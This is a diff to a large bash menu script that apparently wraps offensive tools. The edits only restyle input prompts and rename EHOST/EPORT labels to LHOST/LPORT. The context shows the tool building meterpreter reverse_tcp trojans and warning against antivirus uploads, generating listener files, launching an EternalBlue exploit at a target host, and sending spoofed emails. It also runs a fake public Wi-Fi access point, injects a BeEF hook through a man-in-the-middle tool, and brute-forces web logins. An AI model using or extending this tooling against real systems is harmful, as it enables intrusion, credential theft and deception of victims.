@@ -2444,19 +2444,19 @@ function eaphammer_automation
 				elif [[ "$EAPH" = 2 ]]
 				then
 					echo -e "Type the interface you want to use: "
-					read EAPHIFACE
+					read -p $'(\e[4;93minterface\e[0m)> ' EAPHIFACE
 				elif [[ "$EAPH" = 3 ]]
 				then
 					echo -e "Type the ESSID: "
-					read EAPHESSID
+					read -p $'(\e[4;93messid\e[0m)> ' EAPHESSID
 				elif [[ "$EAPH" = 4 ]]
 				then
 					echo -e "Type the BSSID: "
-					read EAPHBSSID
+					read -p $'(\e[4;93mbssid\e[0m)> ' EAPHBSSID
 				elif [[ "$EAPH" = 5 ]]
 				then
 					echo -e "Type the channel: "
-					read EAPHCHANNEL
+					read -p $'(\e[4;93mchannel\e[0m)> ' EAPHCHANNEL
 				elif [[ "$EAPH" = 6 ]]
 				then
 					if [[ "$EAPHWPA" = 1 ]]
@@ -2527,9 +2527,9 @@ function eaphammer_automation
 					then
 						clear
 						echo -e "Hostname: "
-						read HOSTN
+						read -p $'(\e[4;93mhostname\e[0m)> ' HOSTN
 						echo -e "Port: "
-						read PORT
+						read -p $'(\e[4;93mport\e[0m)> ' PORT
 						clear
 						EAPHAIRCRACK=""$HOSTN":"$PORT""
 					else
@@ -2551,7 +2551,7 @@ function eaphammer_automation
 					else
 						clear
 						echo -e "Type the full wordlist path: "
-						read EAPHWORD
+						read -p $'(\e[4;93mpath\e[0m)> ' EAPHWORD
 					fi
 				elif [[ "$EAPH" = "back" || "$EAPH" = "b" ]]
 				then
@@ -2886,7 +2886,7 @@ do
 	elif [[ "$DR" = 1 ]]
 	then
 		echo -e "Malware URL: "
-		read MALURL
+		read -p $'(\e[4;93murl\e[0m)> ' MALURL
 	elif [[ "$DR" = 14 ]]
 	then
 		if [[ "$ICON" = "OFF" ]]
@@ -2947,7 +2947,7 @@ do
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
 				echo -e "Enter the name of your script: "
-				read RUNVBS
+				read -p $'(\e[4;93mname\e[0m)> ' RUNVBS
 				if [[ "$RUNVBS" = "b" ]]
 				then
 					RUNVBS="OFF"
@@ -2956,7 +2956,7 @@ do
 				then
 					clear
 					echo -e "Your file path: "
-					read FP
+					read -p $'(\e[4;93mpath\e[0m)> ' FP
 					if [[ ! -f "$FP" ]]
 					then
 						echo -e ""$RS"File does not exist."$CE""
@@ -2994,7 +2994,7 @@ do
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
 				echo -e "Enter the name of your script: "
-				read RUNPOW
+				read -p $'(\e[4;93mname\e[0m)> ' RUNPOW
 				if [[ "$RUNPOW" = "b" ]]
 				then
 					RUNPOW="OFF"
@@ -3003,7 +3003,7 @@ do
 				then
 					clear
 					echo -e "Your file path: "
-					read FP
+					read -p $'(\e[4;93mpath\e[0m)> ' FP
 					if [[ ! -f "$FP" ]]
 					then
 						echo -e ""$RS"File does not exist."$CE""
@@ -3041,7 +3041,7 @@ do
 				echo -e ""$YS"cp"$CE") Copy my script to that folder"
 				echo -e ""$YS" b"$CE") Go back"
 				echo -e "Enter the name of your script: "
-				read RUNBAT
+				read -p $'(\e[4;93mname\e[0m)> ' RUNBAT
 				if [[ "$RUNBAT" = "b" ]]
 				then
 					RUNBAT="OFF"
@@ -3050,7 +3050,7 @@ do
 				then
 					clear
 					echo -e "Your file path: "
-					read FP
+					read -p $'(\e[4;93mpath\e[0m)> ' FP
 					if [[ ! -f "$FP" ]]
 					then
 						echo -e ""$RS"File does not exist."$CE""
@@ -6136,16 +6136,16 @@ function metasploit_menu
 			sleep 2
 			PAYLOADL="windows/meterpreter/reverse_tcp"
 		fi
-		echo -e "EHOST: "
-		read ATIP
+		echo -e "LHOST: "
+		read -p $'(\e[4;93mlhost\e[0m)> ' ATIP
 		echo -e ""
-		echo -e "EPORT: "
-		read ATPORT
+		echo -e "LPORT: "
+		read -p $'(\e[4;93mlport\e[0m)> ' ATPORT
 		echo -e ""
 		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
-		read TARCH
+		read -p $'(\e[4;93march\e[0m)> ' TARCH
 		echo -e "Enter the name of the payload(e.g: "$YS"trojan2"$CE"): "
-		read ATEXE
+		read -p $'(\e[4;93mname\e[0m)> ' ATEXE
 		ATEXEPATH="/root/Desktop/$ATEXE.exe"
 		clear
 		echo -e "Generating"
@@ -6173,11 +6173,11 @@ function metasploit_menu
 		$READAK
 		clear
 		echo -e "Create a listener for this payload? $YNYES "
-		read PAYL
+		read -p $'(\e[4;93mcreate\e[0m)> ' PAYL
 		if [[ "$PAYL" != "n" ]]
 		then
 			echo -e "Name of listener(e.g: "$YS"john"$CE") : "
-			read NAMEL
+			read -p $'(\e[4;93mname\e[0m)> ' NAMEL
 			echo "use exploit/multi/handler" > "$EPATH"/rc/"$NAMEL".rc
 			echo "set PAYLOAD $PAYLOADL " >> "$EPATH"/rc/"$NAMEL".rc
 			echo "set EHOST $ATIP " >> "$EPATH"/rc/"$NAMEL".rc
@@ -6186,7 +6186,7 @@ function metasploit_menu
 			echo "exploit -j" >> "$EPATH"/rc/"$NAMEL".rc
 			clear
 			echo -e "Launch the listener now? "$YNONLY""
-			read LLN
+			read -p $'(\e[4;93mlaunch\e[0m)> ' LLN
 			if [[ "$LLN" = "y" ]]
 			then
 				echo -e "Launching msfconsole..."
@@ -6201,7 +6201,7 @@ function metasploit_menu
 		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
 		sleep 3
 		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
-		read MUSTBEYES
+		read -p $'(\e[4;93magree\e[0m)> ' MUSTBEYES
 		if [[ "$MUSTBEYES" = "YES" ]] 
 		then 
 			clear
@@ -6211,12 +6211,12 @@ function metasploit_menu
 	elif [[ "$METASP" = "2" ]]
 	then
 		clear
-		echo -e "EHOST: "
-		read EHOSTL
-		echo -e "EPORT: "
-		read EPORTL
+		echo -e "LHOST: "
+		read -p $'(\e[4;93mlhost\e[0m)> ' EHOSTL
+		echo -e "LPORT: "
+		read -p $'(\e[4;93mlport\e[0m)> ' EPORTL
 		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
-		read PAYLOADL
+		read -p $'(\e[4;93mpayload\e[0m)> ' PAYLOADL
 		if [[ -z "$PAYLOADL" ]]
 		then
 			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
@@ -6224,7 +6224,7 @@ function metasploit_menu
 			PAYLOADL="windows/meterpreter/reverse_tcp"
 		fi
 		echo -e "Name of listener(e.g: "$YS"john"$CE") : "
-		read NAMEL
+		read -p $'(\e[4;93mname\e[0m)> ' NAMEL
 		echo "use exploit/multi/handler" > "$EPATH"/rc/"$NAMEL".rc
 		echo "set PAYLOAD $PAYLOADL " >> "$EPATH"/rc/"$NAMEL".rc
 		echo "set EHOST $EHOSTL " >> "$EPATH"/rc/"$NAMEL".rc
@@ -6233,7 +6233,7 @@ function metasploit_menu
 		echo "exploit -j" >> "$EPATH"/rc/"$NAMEL".rc
 		clear
 		echo -e "Launch the listener now? "$YNONLY""
-		read LLN
+		read -p $'(\e[4;93mlaunch\e[0m)> ' LLN
 		if [[ "$LLN" = "y" ]]
 		then
 			echo -e "Launching msfconsole..."
@@ -6252,7 +6252,7 @@ function metasploit_menu
 		echo -e "Enter the name of the listener you want to select(e.g: "$YS"john"$CE")"
 		echo -e ""$YS" r"$CE") Delete all saved listeners"
 		echo -e ""$YS" b"$CE") Go back"
-		read NAMERC
+		read -p $'(\e[4;93mlistener\e[0m)> ' NAMERC
 		clear
 		if [[ "$NAMERC" = "back" || "$NAMERC" = "b" ]]
 		then
@@ -6644,17 +6644,17 @@ function eternalblue
 	EG=$(local_ips $WLANN)
 	if [[ "$EG" != "" ]]
 	then
-		echo -e "EHOST: ("$YS""Enter""$CE"="$EG") "
+		echo -e "LHOST: ("$YS""Enter""$CE"="$EG") "
 	else
-		echo -e "EHOST: "
+		echo -e "LHOST: "
 	fi
-	read EHOSTL
+	read -p $'(\e[4;93mlhost\e[0m)> ' EHOSTL
 	if [[ "$EG" != "" && "$EHOSTL" = "" ]]
 	then
 		EHOSTL="$EG"
 	fi
 	echo -e "RHOST: "
-	read RHOSTL
+	read -p $'(\e[4;93mrhost\e[0m)> ' RHOSTL
 	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
 	read TARGETARCHL
 	if [[ "$TARGETARCHL" = "x64" ]]
@@ -6665,7 +6665,7 @@ function eternalblue
 		PAYLOADL="windows/meterpreter/reverse_tcp"
 	fi
 	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
-	read TARGETL
+	read -p $'(\e[4;93mtarget\e[0m)> ' TARGETL
 	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$EPATH"/rce/eternalbluerc.rc
 	echo "set EHOST "$EHOSTL"" >> "$EPATH"/rce/eternalbluerc.rc
 	echo "set RHOST "$RHOSTL"" >> "$EPATH"/rce/eternalbluerc.rc
@@ -6796,10 +6796,10 @@ do
 	if [[ "$SMTP" = "1" ]]
 	then
 		clear
-		echo -e "Enter your smtp username(find it here: https://app.smtp2go.com/settings/users ): "
-		read SMTPEMAIL
-		echo -e "Enter your smtp password(find it here: https://app.smtp2go.com/settings/users ): "
-		read SMTPPASS
+		echo -e "Enter your smtp username (find it here: https://app.smtp2go.com/settings/users)"
+		read -p $'(\e[4;93musername\e[0m)> ' SMTPEMAIL
+		echo -e "Enter your smtp password (find it here: https://app.smtp2go.com/settings/users)"
+		read -p $'(\e[4;93mpassword\e[0m)> ' SMTPPASS
 		clear
 		echo "$SMTPEMAIL" > /bin/ehtools/smtp/smtpemail.txt
 		echo "$SMTPPASS" > /bin/ehtools/smtp/smtppass.txt 
@@ -6863,21 +6863,21 @@ do
 		echo -e "Your username is "$RS""$smtpemail""$CE""
 		echo -e ""
 		echo -e "Enter the target's email: "
-		read TARGETSEMAIL
+		read -p $'(\e[4;93mtarget\e[0m)> ' TARGETSEMAIL
 		echo -e "Enter the email that you want the target to see: "
-		read SPOOFEDEMAIL
+		read -p $'(\e[4;93memail\e[0m)> ' SPOOFEDEMAIL
 		echo -e "Enter the subject of the message: "
-		read SUBJECTEMAIL
+		read -p $'(\e[4;93msubject\e[0m)> ' SUBJECTEMAIL
 		echo -e "Enter the message: "
-		read MESSAGEEMAIL
+		read -p $'(\e[4;93mmessage\e[0m)> ' MESSAGEEMAIL
 		echo -e "Enter the smtp server ("$YS"Enter"$CE"=mail.smtp2go.com): "
-		read SMTPSERVER
+		read -p $'(\e[4;93mserver\e[0m)> ' SMTPSERVER
 		if [[ "$SMTPSERVER" = "" ]]
 		then
 			SMTPSERVER="mail.smtp2go.com"
 		fi
 		echo -e "Enter the smtp port ("$YS"Enter"$CE"=2525): "
-		read SMTPPORT
+		read -p $'(\e[4;93mport\e[0m)> ' SMTPPORT
 		if [[ "$SMTPPORT" = "" ]]
 		then
 			SMTPPORT="2525"
@@ -7058,7 +7058,7 @@ function wififb
 	echo -e ""$YS"11"$CE") FREE PUBLIC WIFI"
 	echo -e " "$YS"c"$CE") Custom name"
 	echo -e " "$YS"b"$CE") Go back"
-	read wifiind
+	read -p $'(\e[4;31mwififb\e[0m)> ' wifiind
 	if [[ "$wifiind" == 1 ]]
 	then
 		wifiname="Free Wifi"
@@ -7257,7 +7257,7 @@ do
 	if [[ "$SQ" = 1 ]]
 	then
 		echo -n "URL: "
-		read URLL
+		read -p $'(\e[4;93murl\e[0m)> ' URLL
 		if [[ "$URLL" != "" || "$URLL" = "b" ]]
 		then
 			URL="$URLL"
@@ -7692,7 +7692,7 @@ function cromos_menu
 			if [[ "$CROM" == 1 ]]
 			then
 				echo -e "Extension ID: "
-				read EXID
+				read -p $'(\e[4;93mID\e[0m)> ' EXID
 				python cromos.py --extension "$EXID" && CEX=""$YS"$EXID"$CE""
 				sleep 2
 			elif [[ "$CROM" == 2 ]]
@@ -7710,7 +7710,7 @@ function cromos_menu
 			elif [[ "$CROM" == 4 ]]
 			then
 				echo -e "File type to build to("$YS"Enter"$CE"="$YS"bat"$CE"):"
-				read buildext
+				read -p $'(\e[4;93mfile\e[0m)> ' buildext
 				if [[ "$buildext" == "" ]]
 				then
 					buildext="bat"
@@ -7721,7 +7721,7 @@ function cromos_menu
 			elif [[ "$CROM" == 5 ]]
 			then
 				echo -e "Token: "
-				read CTOK
+				read -p $'(\e[4;93mtoken\e[0m)> ' CTOK
 				python cromos.py --extension "$EXID" --token "$CTOK"
 				echo -e "$PAKTGB"
 				$READAK
@@ -7779,7 +7779,7 @@ function mitmf_hook
 			export mitmfgate
 			clear
 			echo -e "Target's IP: "
-			read mitmftar
+			read -p $'(\e[4;93mtarget\e[0m)> ' mitmftar
 			TEST=$(ifconfig | grep $mitmfint)
 			if [[ $TEST != "" ]]
 			then
@@ -7789,7 +7789,7 @@ function mitmf_hook
 			fi
 			clear
 			echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
-			read hookch
+			read -p $'(\e[4;93murl\e[0m)> ' hookch
 			if [[ "$hookch" = "" ]]
 			then
 				mitmfhook="http://"$mitmflocalip":3000/hook.js"
@@ -7933,11 +7933,11 @@ do
 	elif [[ "$BR" = 2 ]]
 	then
 		echo -n "Username: "
-		read US
+		read -p $'(\e[4;93musername\e[0m)> ' US
 	elif [[ "$BR" = 3 ]]
 	then
 		echo -n "Wordlist: "
-		read WL
+		read -p $'(\e[4;93mwordlist\e[0m)> ' WL
 		if [[ ! -f "$WL" ]]
 		then
 			WL=""
@@ -7950,22 +7950,22 @@ do
 	elif [[ "$BR" = 4 ]]
 	then
 		echo -n "Request URI: "
-		read RQ
+		read -p $'(\e[4;93murl\e[0m)> ' RQ
 		rqq=1
 	elif [[ "$BR" = 5 ]]
 	then
 		echo -n "^USER^ & ^PASS^ field: "
-		read UP
+		read -p $'(\e[4;93mfield\e[0m)> ' UP
 		upp=1
 	elif [[ "$BR" = 6 ]]
 	then
 		echo -n "Invalid pass string: "
-		read IS
+		read -p $'(\e[4;93mstring\e[0m)> ' IS
 		iss=1
 	elif [[ "$BR" = 7 ]]
 	then
 		echo -n "Form: "
-		read FM
+		read -p $'(\e[4;93mform\e[0m)> ' FM
 	elif [[ "$BR" = 8 ]]
 	then
 		if [[ "$bin" != 1 ]]
